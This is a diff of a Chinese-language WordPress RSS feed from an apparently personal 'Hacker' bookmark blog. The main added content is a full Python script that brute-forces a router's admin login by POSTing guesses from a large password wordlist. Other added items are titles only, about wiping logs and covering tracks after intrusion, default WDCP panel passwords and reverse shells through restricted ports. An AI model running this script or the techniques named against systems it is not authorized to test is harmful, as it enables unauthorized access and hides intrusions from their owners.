@@ -12,7 +12,7 @@
 	<atom:link href="https://myiszero.github.io/mywebsite/category/hacker/feed" rel="self" type="application/rss+xml" />
 	<link>https://myiszero.github.io/mywebsite</link>
 	<description>我的收藏夹</description>
-	<lastBuildDate>Mon, 10 Oct 2022 03:46:13 +0000</lastBuildDate>
+	<lastBuildDate>Sat, 15 Oct 2022 09:21:45 +0000</lastBuildDate>
 	<language>zh-CN</language>
 	<sy:updatePeriod>
 	hourly	</sy:updatePeriod>
@@ -20,47 +20,70 @@
 	1	</sy:updateFrequency>
 	<generator>https://wordpress.org/?v=6.0.2</generator>
 	<item>
-		<title>SQL注入的小技巧</title>
-		<link>https://myiszero.github.io/mywebsite/1160.html</link>
+		<title>暴力破解路由器管理密码</title>
+		<link>https://myiszero.github.io/mywebsite/1271.html</link>
 		
 		<dc:creator><![CDATA[admin]]></dc:creator>
-		<pubDate>Mon, 10 Oct 2022 02:46:39 +0000</pubDate>
+		<pubDate>Sat, 15 Oct 2022 09:15:12 +0000</pubDate>
 				<category><![CDATA[Hacker]]></category>
-		<guid isPermaLink="false">https://myiszero.github.io/mywebsite/?p=1160</guid>
+		<guid isPermaLink="false">https://myiszero.github.io/mywebsite/?p=1271</guid>
 
-					<description><![CDATA[转自]]></description>
-										<content:encoded><![CDATA[<p>转<a href="https://twitter.com/hackinarticles/status/1578268351389843456" target="_blank" rel="noopener">自</a></p>
-<p><span id="more-1160"></span><img loading="lazy" class="alignnone size-full wp-image-1163" src="https://myiszero.github.io/mywebsite/wp-content/uploads/2022/10/FecikKcUcAAmMNM.jpg" alt="" width="705" height="975" srcset="https://myiszero.github.io/mywebsite/wp-content/uploads/2022/10/FecikKcUcAAmMNM.jpg 705w, https://myiszero.github.io/mywebsite/wp-content/uploads/2022/10/FecikKcUcAAmMNM-217x300.jpg 217w" sizes="(max-width: 705px) 100vw, 705px" /></p>
+					<description><![CDATA[转自 # -*- coding: utf-8 -*- import reques &#8230; <a href="https://myiszero.github.io/mywebsite/1271.html">继续阅读 <span class="meta-nav">&#8594;</span></a>]]></description>
+										<content:encoded><![CDATA[<p>转<a href="https://blog.csdn.net/qq_21078159/article/details/106730677" target="_blank" rel="noopener">自</a></p>
+<p><span id="more-1271"></span></p>
+<pre class="pure-highlightjs"><code class="hljs dts"># -*- coding: utf-8 -*-
+
+import requests
+from itertools import islice
+import sys
+headers = {
+'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0',
+'Cookie':'LOGINCOUNT=1; LOGIN_PSD_REM_FLAG=0; PSWMOBILEFLAG=true'
+}
+
+def post(passwd):
+data="psd="+passwd
+res = requests.post(url="http://192.168.124.1/router_password_mobile.asp"
+,data=data,headers=headers)
+if('var resultInfo="true;0";' in res.text):
+return True
+else:
+return False
+
+def record(content):
+with open("E:/work/36.4GB-18_in_1.lst/passwd.txt", 'w') as file:
+file.write(content)
+
+def readDic(skip):
+linenum = skip - 1
+with open("E:/work/36.4GB-18_in_1.lst/18_in_1.lst", 'r') as file:
+for line in islice(file,skip,None):
+linenum = linenum+1
+line=line.replace('\n',"")
+res=post(line)
+print(str(linenum)+" "+line+" "+str(res), end="|")
+if(res):
+print("FOUND!")
+record("FOUND! "+str(linenum)+" "+line+" "+str(res))
+break
+if(linenum%1000 == 0):
+record(str(linenum)+" "+line+" "+str(res))
+if __name__ == "__main__":
+
+readDic(0)</code></pre>
 ]]></content:encoded>
 					
 		
 		
 			</item>
 		<item>
-		<title>找人利器</title>
-		<link>https://myiszero.github.io/mywebsite/1158.html</link>
+		<title>HackTheBox &#8211; Oopsie</title>
+		<link>https://myiszero.github.io/mywebsite/1256.html</link>
 		
 		<dc:creator><![CDATA[admin]]></dc:creator>
-		<pubDate>Mon, 10 Oct 2022 02:42:59 +0000</pubDate>
+		<pubDate>Sat, 15 Oct 2022 08:56:09 +0000</pubDate>
 				<category><![CDATA[Hacker]]></category>
-		<guid isPermaLink="false">https://myiszero.github.io/mywebsite/?p=1158</guid>
-
-					<description><![CDATA[输入 id，就能把互联网上你的相关账号全部扒出来，而且不仅仅是简单的 id 匹配 &#8230; <a href="https://myiszero.github.io/mywebsite/1158.html">继续阅读 <span class="meta-nav">&#8594;</span></a>]]></description>
-										<content:encoded><![CDATA[<p><span class="css-901oao css-16my406 r-poiln3 r-bcqeeo r-qvutc0">输入 id，就能把互联网上你的相关账号全部扒出来，而且不仅仅是简单的 id 匹配，你的用户资料字段也会被匹配，而且连 pornhub/xvideo 账号都有。</span></p>
-<p>转<a href="https://twitter.com/ezogreatagain/status/1578571422393257984" target="_blank" rel="noopener">自</a></p>
-]]></content:encoded>
-					
-		
-		
-			</item>
-		<item>
-		<title>使用PuTTY客户端（putty.exe或plink.exe）来执行SSH登录暴力攻击</title>
-		<link>https://myiszero.github.io/mywebsite/1142.html</link>
-		
-		<dc:creator><![CDATA[admin]]></dc:creator>
-		<pubDate>Mon, 10 Oct 2022 02:22:03 +0000</pubDate>
-				<category><![CDATA[Hacker]]></category>
-		<guid isPermaLink="false">https://myiszero.github.io/mywebsite/?p=1142</guid>
+		<guid isPermaLink="false">https://myiszero.github.io/mywebsite/?p=1256</guid>
 
 					<description><![CDATA[]]></description>
 										<content:encoded><![CDATA[]]></content:encoded>
@@ -69,13 +92,13 @@
 		
 			</item>
 		<item>
-		<title>Fiddler汉化插件 &#038; 汉化文本</title>
-		<link>https://myiszero.github.io/mywebsite/1126.html</link>
+		<title>清除日志</title>
+		<link>https://myiszero.github.io/mywebsite/1244.html</link>
 		
 		<dc:creator><![CDATA[admin]]></dc:creator>
-		<pubDate>Sat, 01 Oct 2022 11:14:39 +0000</pubDate>
+		<pubDate>Sat, 15 Oct 2022 08:47:31 +0000</pubDate>
 				<category><![CDATA[Hacker]]></category>
-		<guid isPermaLink="false">https://myiszero.github.io/mywebsite/?p=1126</guid>
+		<guid isPermaLink="false">https://myiszero.github.io/mywebsite/?p=1244</guid>
 
 					<description><![CDATA[]]></description>
 										<content:encoded><![CDATA[]]></content:encoded>
@@ -84,13 +107,13 @@
 		
 			</item>
 		<item>
-		<title>burp添加插件</title>
-		<link>https://myiszero.github.io/mywebsite/1123.html</link>
+		<title>入侵后清除脚印</title>
+		<link>https://myiszero.github.io/mywebsite/1242.html</link>
 		
 		<dc:creator><![CDATA[admin]]></dc:creator>
-		<pubDate>Sat, 01 Oct 2022 11:13:12 +0000</pubDate>
+		<pubDate>Sat, 15 Oct 2022 08:46:24 +0000</pubDate>
 				<category><![CDATA[Hacker]]></category>
-		<guid isPermaLink="false">https://myiszero.github.io/mywebsite/?p=1123</guid>
+		<guid isPermaLink="false">https://myiszero.github.io/mywebsite/?p=1242</guid>
 
 					<description><![CDATA[]]></description>
 										<content:encoded><![CDATA[]]></content:encoded>
@@ -99,13 +122,13 @@
 		
 			</item>
 		<item>
-		<title>关于PJ WPA-PSK的一种方法延伸用彩虹表爆破</title>
-		<link>https://myiszero.github.io/mywebsite/1104.html</link>
+		<title>App 爬虫神器！Mitmproxy 快速带你入坑！</title>
+		<link>https://myiszero.github.io/mywebsite/1240.html</link>
 		
 		<dc:creator><![CDATA[admin]]></dc:creator>
-		<pubDate>Wed, 28 Sep 2022 11:21:34 +0000</pubDate>
+		<pubDate>Sat, 15 Oct 2022 08:42:31 +0000</pubDate>
 				<category><![CDATA[Hacker]]></category>
-		<guid isPermaLink="false">https://myiszero.github.io/mywebsite/?p=1104</guid>
+		<guid isPermaLink="false">https://myiszero.github.io/mywebsite/?p=1240</guid>
 
 					<description><![CDATA[]]></description>
 										<content:encoded><![CDATA[]]></content:encoded>
@@ -114,13 +137,13 @@
 		
 			</item>
 		<item>
-		<title>hashcat 工具跑包</title>
-		<link>https://myiszero.github.io/mywebsite/1102.html</link>
+		<title>推荐无线网卡</title>
+		<link>https://myiszero.github.io/mywebsite/1238.html</link>
 		
 		<dc:creator><![CDATA[admin]]></dc:creator>
-		<pubDate>Wed, 28 Sep 2022 11:18:40 +0000</pubDate>
+		<pubDate>Sat, 15 Oct 2022 07:27:19 +0000</pubDate>
 				<category><![CDATA[Hacker]]></category>
-		<guid isPermaLink="false">https://myiszero.github.io/mywebsite/?p=1102</guid>
+		<guid isPermaLink="false">https://myiszero.github.io/mywebsite/?p=1238</guid>
 
 					<description><![CDATA[]]></description>
 										<content:encoded><![CDATA[]]></content:encoded>
@@ -129,13 +152,13 @@
 		
 			</item>
 		<item>
-		<title>hashcat（wifi暴力破解）</title>
-		<link>https://myiszero.github.io/mywebsite/1096.html</link>
+		<title>勒索软件解密工具</title>
+		<link>https://myiszero.github.io/mywebsite/1229.html</link>
 		
 		<dc:creator><![CDATA[admin]]></dc:creator>
-		<pubDate>Wed, 28 Sep 2022 11:13:17 +0000</pubDate>
+		<pubDate>Sat, 15 Oct 2022 05:46:21 +0000</pubDate>
 				<category><![CDATA[Hacker]]></category>
-		<guid isPermaLink="false">https://myiszero.github.io/mywebsite/?p=1096</guid>
+		<guid isPermaLink="false">https://myiszero.github.io/mywebsite/?p=1229</guid>
 
 					<description><![CDATA[]]></description>
 										<content:encoded><![CDATA[]]></content:encoded>
@@ -144,13 +167,13 @@
 		
 			</item>
 		<item>
-		<title>HPing3构造多种类型DDOS攻击使用详解</title>
-		<link>https://myiszero.github.io/mywebsite/1091.html</link>
+		<title>wdcp后台默认用户密码是多少?wdlinux.cn</title>
+		<link>https://myiszero.github.io/mywebsite/1225.html</link>
 		
 		<dc:creator><![CDATA[admin]]></dc:creator>
-		<pubDate>Wed, 28 Sep 2022 11:04:34 +0000</pubDate>
+		<pubDate>Sat, 15 Oct 2022 05:26:53 +0000</pubDate>
 				<category><![CDATA[Hacker]]></category>
-		<guid isPermaLink="false">https://myiszero.github.io/mywebsite/?p=1091</guid>
+		<guid isPermaLink="false">https://myiszero.github.io/mywebsite/?p=1225</guid>
 
 					<description><![CDATA[]]></description>
 										<content:encoded><![CDATA[]]></content:encoded>
@@ -159,13 +182,28 @@
 		
 			</item>
 		<item>
-		<title>CMD隐藏黑窗口运行</title>
-		<link>https://myiszero.github.io/mywebsite/1079.html</link>
+		<title>WDCP 重大漏洞 密码为明文 直接用PHP能读取到密码 默认直接跨站</title>
+		<link>https://myiszero.github.io/mywebsite/1223.html</link>
 		
 		<dc:creator><![CDATA[admin]]></dc:creator>
-		<pubDate>Wed, 28 Sep 2022 09:48:44 +0000</pubDate>
+		<pubDate>Sat, 15 Oct 2022 05:26:05 +0000</pubDate>
 				<category><![CDATA[Hacker]]></category>
-		<guid isPermaLink="false">https://myiszero.github.io/mywebsite/?p=1079</guid>
+		<guid isPermaLink="false">https://myiszero.github.io/mywebsite/?p=1223</guid>
+
+					<description><![CDATA[]]></description>
+										<content:encoded><![CDATA[]]></content:encoded>
+					
+		
+		
+			</item>
+		<item>
+		<title>照弹不误：出站端口受限环境下反弹Shell的思考</title>
+		<link>https://myiszero.github.io/mywebsite/1206.html</link>
+		
+		<dc:creator><![CDATA[admin]]></dc:creator>
+		<pubDate>Sat, 15 Oct 2022 04:13:03 +0000</pubDate>
+				<category><![CDATA[Hacker]]></category>
+		<guid isPermaLink="false">https://myiszero.github.io/mywebsite/?p=1206</guid>
 
 					<description><![CDATA[]]></description>
 										<content:encoded><![CDATA[]]></content:encoded>
